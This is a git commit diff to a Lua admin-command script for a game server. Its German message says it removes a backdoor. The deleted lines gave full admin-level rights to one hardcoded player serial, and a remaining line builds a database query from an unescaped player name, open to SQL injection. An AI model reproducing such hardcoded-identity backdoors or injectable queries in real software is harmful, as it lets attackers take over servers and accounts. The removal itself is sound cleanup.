08ca84c54a6863d70e46ac77f0ca88f82497a6fa
Mezzo1224 <maxfoidl@web.de>
2020-04-26 11:16:00 +0200

    Backdoor entfernt
    Einen Backdoor entfernt, der mir ggf. Adminrechte geben konnte

--- reallife_server/admin/admincmds.lua
+++ reallife_server/admin/admincmds.lua
@@ -2052,10 +2052,10 @@ addCommandHandler ( "suppmode",  suppmode_func)
 
 function adminlevel_func ( player, cmd, target, adminlevel )
 
-		if isAdminLevel ( player, 8 ) or getPlayerSerial(player) == "01D9C87D492ED103CC7ADA9107CB05F2" then
+		if isAdminLevel ( player, 8 ) then
 		local tplayer = getPlayerFromName (target)
 		if getElementData ( tplayer, "loggedin" ) == 1 then
-			if getAdminLevel ( player ) > getAdminLevel ( tplayer ) and not getPlayerSerial(player) == "01D9C87D492ED103CC7ADA9107CB05F2" then
+			if getAdminLevel ( player ) > getAdminLevel ( tplayer ) then
 				if tonumber(adminlevel) and target then
 					if dbExist ( "userdata", "Name LIKE '"..target.."'") then
 						local adminlevelnr = tonumber(adminlevel)
